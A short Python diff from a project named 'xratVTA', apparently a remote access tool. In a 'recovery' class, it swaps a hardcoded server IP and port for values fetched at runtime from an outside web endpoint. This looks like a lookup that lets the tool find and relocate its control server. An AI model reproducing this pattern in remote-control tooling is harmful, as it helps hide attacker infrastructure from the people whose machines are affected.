@@ -10,9 +10,12 @@ ADEMÁS, SE VA A BUSCAR ACTUALIZACIONES DEL REPOSITORIO"""
 
 class recovery():
     def __init__(self, error:Exception) -> None:
+
+        responseServer = requests.get("https://varlives.vercel.app/?key=ipVPS").json()
+
         self.INFO_AUX = {
-            "ip": "159.112.139.10",
-            "port": 7788,
+            "ip": responseServer["value"],
+            "port": responseServer["port"],
             "owner": "TechAtlasDev",
             "project": "xratVTA"
         }
